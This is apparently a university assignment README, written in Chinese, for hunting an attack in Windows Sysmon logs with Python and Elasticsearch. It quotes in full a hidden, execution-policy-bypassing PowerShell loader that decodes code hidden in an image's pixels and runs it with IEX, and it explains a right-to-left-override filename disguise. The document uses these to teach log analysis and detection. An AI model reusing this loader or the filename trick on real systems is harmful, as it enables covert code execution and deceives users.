# 日誌分析作業

用 Python 在十幾萬筆 Windows 電腦日誌裡找出一場攻擊的痕跡。

不需要資安背景。需要用到的知識，題目裡會直接給。

這個資料夾包含：

| 檔案 | 說明 |
|---|---|
| `README.md` | 本作業說明 |
| `es.py` | 連資料庫用的工具 |
| `monkey.png` | 加分題用的圖片 |

| 題目 | 配分 | 小題 |
|---|---|---|
| 基本題一：誰啟動了誰 | 50 | 4 |
| 基本題二：找出對外連線的那根針 | 50 | 2 |
| 加分題：把藏在圖片裡的程式碼挖出來 | +20 | 2 |

**每一題都有「程式輸出」和「報告要寫」兩段。這兩段是全部的要求，
其他段落是背景說明和提示，不用回答。**

## 使用 AI

允許，也鼓勵。可以請 AI 解釋概念、教你寫查詢、幫你 debug，免費方案應該就夠用。

唯一的要求是在報告最後寫三到五行「我用 AI 做了什麼」，不用附對話紀錄。

---

## 1. 環境準備

### 1.1 啟動

```bash
./setup.sh          # 第一次約 10 分鐘，大部分時間在下載
```

看到 `Lab is ready.` 表示成功。之後用 `./setup.sh` 重開、`./setup.sh --down` 關掉。

### 1.2 確認資料在

```bash
curl -s "http://localhost:9200/_cat/indices/winlogbeat-apt29-*?v&h=index,docs.count"
```

要看到這一行：

```
index                         docs.count
winlogbeat-apt29-host-day1        196081
```

數字對不上就先別往下做，跑 `./setup.sh --clean` 再 `./setup.sh`。

如果還看到一行 `winlogbeat-apt29-zeek-day1`，這份作業用不到，可以忽略。

### 1.3 資料

四台 Windows 電腦一個早上的日誌，共 196,081 筆，都在
`winlogbeat-apt29-host-day1` 這個 index。

| 電腦 | IP |
|---|---|
| SCRANTON | 10.0.1.4 |
| NASHUA | 10.0.1.6 |
| NEWYORK | 10.0.0.4 |
| UTICA | 10.0.1.5 |

日誌的時間被平移到固定區間，所有人看到的一樣：

```
2026-09-17  12:00 – 12:40   （台北時間）
```

這個時間只影響 Kibana 網頁的時間選擇器。寫 Python 查資料不受影響。

### 1.4 會用到的欄位

| 欄位 | 意思 |
|---|---|
| `EventID` | 事件種類。`1` = 有程式被啟動，`3` = 有對外連線 |
| `host.name` | 來自哪一台電腦 |
| `@timestamp` | 發生時間 |
| `Image` | 被啟動的程式，與其完整路徑 |
| `ParentImage` | 啟動此程式的母程式，與其完整路徑 |
| `CommandLine` | 啟動時帶的參數 |
| `DestinationIp` | 連到哪個 IP |
| `DestinationPort` | 連到哪個 port |

電腦裡每個程式都是被另一個程式啟動的，`ParentImage` 記錄的就是啟動者。

### 1.5 es.py

`es.py` 已經放在資料夾裡，先跑一次確認環境：

```bash
uv run es.py        # 印出 196081 就沒問題
```

用法：

```python
from es import fetch_all

events = fetch_all(
    {"term": {"EventID": 1}},                                            # 條件
    ["@timestamp", "host.name", "Image", "ParentImage", "CommandLine"],  # 要哪些欄位
)
print(len(events))
print(events[0])
```

更多查詢寫法在附錄，需要時再翻。

---

## 2. 基本題一：誰啟動了誰（50 分）

四台電腦整個早上只有 450 次「程式被啟動」的事件（`EventID: 1`），
佔全部日誌的 0.2%。這 450 次大多是 Windows 的例行工作，同樣的組合會重複出現。
攻擊者做的事情通常只出現一次。這一大題就是用出現次數把它們篩出來。

程式寫在 `q1.py`。

### 第 1 題：數數看（10 分）

抓出全部 `EventID: 1` 的事件，取 `@timestamp`、`host.name`、`Image`、
`ParentImage`、`CommandLine` 五個欄位。

**程式輸出**（數字是示意，不是答案）

```
總筆數: 1234
ALPHA.example.local   500
BRAVO.example.local   400
CHARLIE.example.local 334
```

**報告要寫**

1. 總共幾筆
2. 每台電腦各幾筆，四台都要列

### 第 2 題：統計配對（15 分）

把每筆事件變成一組 `(ParentImage, Image)` 配對，統計每組出現幾次。

**程式輸出**（數字是示意）

```
出現最多的 5 組：
   500  aaa.exe -> bbb.exe
   400  ccc.exe -> ddd.exe
   300  eee.exe -> fff.exe
   200  ggg.exe -> hhh.exe
   100  iii.exe -> jjj.exe

只出現 1 次的有 99 組
```

**報告要寫**

1. 出現最多的 5 組配對，含次數
2. 只出現 1 次的配對有幾組

**提示**

- `collections.Counter` 就夠用。
- 有少數幾筆紀錄缺少 `Image` 欄位。用 `e.get("Image")` 取值，用 `e["Image"]` 程式會 error。

### 第 3 題：從罕見的裡面挑出可疑的（15 分）

第 2 題的「只出現 1 次」清單有 80 幾組，裡面大部分是正常的。
Windows 開機時本來就有一堆只跑一次的程式。所以再加第二個條件：看程式住在哪裡。

正常的 Windows 程式幾乎都住在固定幾個資料夾。把這四個資料夾底下的當成正常：

```
C:\Windows\System32     Windows 本體
C:\Windows\SysWOW64     Windows 本體（32 位元版）
C:\WindowsAzure         雲端主機的管理程式，這個實驗環境自己的雜訊
C:\Packages             同上
```

規則：從「只出現 1 次」的清單裡，只留下 `Image` 和 `ParentImage`
**兩邊都不在**上面四個資料夾底下的配對。任何一邊落在裡面就丟掉。

過濾後剩下的數量是個位數。

**程式輸出**（路徑是示意）

```
過濾後剩 3 組：

  C:\Some\Path\aaa.exe
    -> C:\Other\Path\bbb.exe

  C:\Some\Path\ccc.exe
    -> C:\Other\Path\ddd.exe

  C:\Some\Path\eee.exe
    -> C:\Other\Path\fff.exe
```

**報告要寫**

1. 過濾後剩下的全部配對，寫完整路徑
2. 從裡面挑 1 組，用 2 到 3 句話說明你為什麼覺得它可疑

第 2 項評分看理由的具體程度，不看你挑哪一組。挑到正常的程式但理由寫得清楚，
一樣給滿分。評分標準見第 5 節。

**提示**

路徑比對前先統一大小寫，例如 `p.lower().startswith("c:\\windows\\system32")`。
資料裡同一個資料夾有時寫成 `C:\Windows\`、有時寫成 `C:\windows\`。

### 第 4 題：兩筆指定的事件（10 分）

這兩筆直接告訴你在哪，不用自己找。

**(a)** 在全部 450 筆裡找出 `Image` 結尾是 `PsExec64.exe` 的事件，
印出它的 `CommandLine`。這幾筆的內容一樣，看一筆就好。

PsExec 是一個公開的正常工具，功能是在另一台電腦上執行程式。

**(b)** 第 3 題的清單裡有一筆，`explorer.exe`（檔案總管）啟動了
`â€®cod.3aka3.scr`。檔名開頭那三個符號是亂碼，它們原本是一個字元，
被用錯誤的編碼解讀成三個。下面這段可以還原：

```python
import unicodedata

name = "â€®cod.3aka3.scr"
ch = name[:3].encode("cp1252").decode("utf-8")
print(repr(ch), unicodedata.name(ch))
```

`cp1252` 是 Windows 的傳統西歐編碼。這裡不能用 `latin-1`，因為 `€` 不在
`latin-1` 的範圍內，會直接 error。

拿到字元名稱後，可以問 AI 這個 Unicode 字元有什麼效果。

**程式輸出**

```
(a) PsExec64.exe 的 CommandLine:
<完整命令列>

(b) 原始檔名  : 'â€®cod.3aka3.scr'
    還原後字元: '\uXXXX' = <字元名稱>
```

**報告要寫**

1. (a) 這行命令列裡有一個東西不應該出現。是什麼？為什麼這是問題？
2. (b) 這個字元會造成什麼效果？使用者在檔案總管裡看到的檔名長什麼樣子？他會以為自己打開了什麼？

---

## 3. 基本題二：找出對外連線的那根針（50 分）

惡意程式要把成果傳回給攻擊者，就會產生網路連線。連線的內容可以偽裝，
但統計上的分布很難掩飾。

`EventID: 3` 是「這台電腦對外建立了一條連線」，共 1,230 筆。

程式寫在 `q2.py`。

### 第 1 題：三張統計表（20 分）

抓出全部 `EventID: 3`，取 `@timestamp`、`host.name`、`Image`、
`DestinationIp`、`DestinationPort`。

分別依 `DestinationPort`、`DestinationIp`、`Image` 分組統計，各取前 10 名。

**程式輸出**（數字是示意）

```
EventID 3 共 1234 筆

1. DestinationPort
     500  1111
     400  2222
     ...（共 10 列）

2. DestinationIp
     500  10.0.0.1
     400  10.0.0.2
     ...（共 10 列）

3. Image
     500  C:\Some\Path\aaa.exe
     400  C:\Some\Path\bbb.exe
     ...（共 10 列）
```

**報告要寫**

1. 三張表，各 10 列，每列都要有「值」和「筆數」

### 第 2 題：鎖定連線最多的那個 port（30 分）

第 1 張表裡的 389、88、53、135、445 是 Windows 網域環境每天都在用的服務
（可以問 AI 它們各是什麼）。第一名那個 port 不在這個名單裡，這一題來看它。

把 `DestinationPort` 等於這個 port 的紀錄篩出來成一個 list，
然後統計下面三項。三項都要列出全部的值，不要只列第一名。

| 統計項 | 怎麼算 |
|---|---|
| 來源電腦 | `Counter(e["host"]["name"] for e in sel)` |
| 目的 IP | `Counter(e["DestinationIp"] for e in sel)` |
| 發出的程式 | `Counter(e["Image"] for e in sel)` |

**程式輸出**（數字是示意）

```
port     : 1111
連線筆數 : 999

來源電腦   : ALPHA.example.local  700
             BRAVO.example.local  299
目的 IP    : 10.0.0.1  999
發出的程式 : C:\Some\Path\aaa.exe  999

來源電腦   共 2 種
目的 IP    共 1 種
發出的程式 共 1 種
```

**報告要寫**

1. 上面那張表：port 號碼、連線筆數，以及三項統計的完整結果
2. 這三項各自有幾種不同的值？這樣的分布正常嗎？為什麼？
3. 看「發出的程式」那個完整路徑，用 3 到 5 句話回答：
   這個程式叫什麼名字、聽起來是什麼軟體、它住在哪個資料夾、
   一個正常安裝的這套軟體會裝在這裡嗎、綜合起來你覺得它可疑嗎

**提示**

`DestinationPort` 在資料裡是字串，比較時要加引號：
`e["DestinationPort"] == "443"`。寫成 `== 443` 不會成立。

---

## 4. 加分題：把藏在圖片裡的程式碼挖出來（+20 分）

這一大題不需要前兩題的答案，可以獨立做。需要 Pillow：`uv add pillow`。

程式寫在 `decode.py`。

基本題一的 450 筆事件裡，有一筆的命令列是這樣（原本是一行，這裡換行方便閱讀）：

```powershell
"PowerShell.exe" -noni -noexit -ep bypass -window hidden -c
"sal a New-Object;
 Add-Type -AssemblyName 'System.Drawing';
 $g = a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');
 $o = a Byte[] 4480;
 for ($i = 0; $i -le 6; $i++) {
   foreach ($x in (0..639)) {
     $p = $g.GetPixel($x, $i);
     $o[$i * 640 + $x] = ([math]::Floor(($p.B -band 15) * 16) -bor ($p.G -band 15))
   }
 };
 $g.Dispose();
 IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
```

會用到的 PowerShell 語法：

| 寫法 | 意思 |
|---|---|
| `$g.GetPixel($x, $i)` | 取出座標 `(x, i)` 的 pixel |
| `$p.B` / `$p.G` | 這個 pixel 的藍色 / 綠色數值，範圍 0 到 255 |
| `-band` | bitwise AND，等同 Python 的 `&` |
| `-bor` | bitwise OR，等同 Python 的 `\|` |
| `[math]::Floor(n)` | 無條件捨去。這裡都是整數，沒有作用 |
| `IEX` | 把一段字串當成程式碼執行 |

### 第 1 題：讀懂它（8 分）

**程式輸出**

無，這題只寫在報告裡。

**報告要寫**

用自己的話寫 5 到 10 句，說明這段程式在做什麼。至少要涵蓋：

1. 它從每個 pixel 取出多少 bit、從哪些顏色通道取
2. 總共讀了幾個 pixel、產生多少 bytes
3. 最後那行 `IEX` 讓整段程式的目的變成什麼

### 第 2 題：寫出 Python 版的解碼器（12 分）

資料夾裡的 `monkey.png` 就是用同一套規則編碼的。寫一支 `decode.py`，
用 Python 做出跟上面那段 PowerShell 一樣的事，把藏在圖片裡的文字印出來。
最後的 `IEX` 不要做，印出來就好。

```python
from PIL import Image

img = Image.open("monkey.png").convert("RGB")
r, g, b = img.getpixel((0, 0))     # 取出第一個 pixel
# 你的程式碼
```

**程式輸出**

解出來的文字，一段可讀的英文。印出亂碼表示算錯了，
最常見的錯誤是高低半個 byte 接反。

**報告要寫**

1. 解出來的文字，貼進報告

---

## 5. 繳交與評分

繳交一個 zip：

```
學號_姓名/
├── report.md   (或 report.pdf)
├── q1.py       # 基本題一
├── q2.py       # 基本題二
└── decode.py   # 加分題，沒做就不用交
```

`monkey.png` 不用交回來。

報告裡每一個數字都要能從你交的程式碼跑出來。報告最後寫三到五行
「我用 AI 做了什麼」。

### 配分

| 題目 | 分數 | 給分依據 |
|---|---|---|
| 基本題一 第 1 題 | 10 | 兩項數字正確 |
| 基本題一 第 2 題 | 15 | 兩項數字正確，統計方法正確 |
| 基本題一 第 3 題 | 15 | 清單正確 5 分，理由 10 分 |
| 基本題一 第 4 題 | 10 | (a) 5 分、(b) 5 分 |
| 基本題二 第 1 題 | 20 | 三張表各 6 到 7 分 |
| 基本題二 第 2 題 | 30 | 第 1 項 15 分、第 2 項 5 分、第 3 項 10 分 |
| 加分題 第 1 題 | +8 | 三個重點各約 2.5 分 |
| 加分題 第 2 題 | +12 | 解得出正確文字 |

基本題一第 3 題「理由」那 10 分的標準：

- 只寫「看起來很奇怪」之類的主觀描述，0 分。
- 講出具體的矛盾，滿分。例如（這是格式示範，不是本題答案）
  「`winword.exe` 是 Word，它啟動了 `cmd.exe` 命令列。文書處理軟體沒有理由
  開命令列，使用者打字時不會需要下指令。而且這個 Word 不在 Office 的安裝目錄，
  是從下載資料夾執行的。」

扣分：

- 報告的數字跟程式跑出來的對不上，該題 0 分
- 沒附程式碼，該題 0 分
- 沒寫 AI 使用說明，扣 5 分

---

## 附錄：查詢寫法速查

```python
# 某個 EventID 有幾筆
{"size": 0, "track_total_hits": True, "query": {"term": {"EventID": 1}}}

# 先看看資料長怎樣（抓 5 筆，全部欄位）
{"size": 5, "query": {"term": {"EventID": 1}}}

# 兩個條件要同時成立
{"query": {"bool": {"must": [
    {"term": {"EventID": 3}},
    {"term": {"DestinationPort": "445"}}]}}}

# 路徑裡包含某個字（Windows 路徑的反斜線要跳脫）
{"query": {"wildcard": {"Image": "*\\\\Temp\\\\*"}}}

# 讓 Elasticsearch 幫忙統計，比抓下來自己數快很多
{"size": 0,
 "query": {"term": {"EventID": 3}},
 "aggs": {"ports": {"terms": {"field": "DestinationPort", "size": 10}}}}
# 結果在 result["aggregations"]["ports"]["buckets"]

# 按時間排序
{"size": 100, "query": {"term": {"EventID": 1}},
 "sort": [{"@timestamp": "asc"}]}
```

不想寫 Python 時，用 curl 直接試：

```bash
curl -s -H 'Content-Type: application/json' \
  "http://localhost:9200/winlogbeat-apt29-host-day1/_search" \
  -d '{"size":1,"query":{"term":{"EventID":1}}}'
```
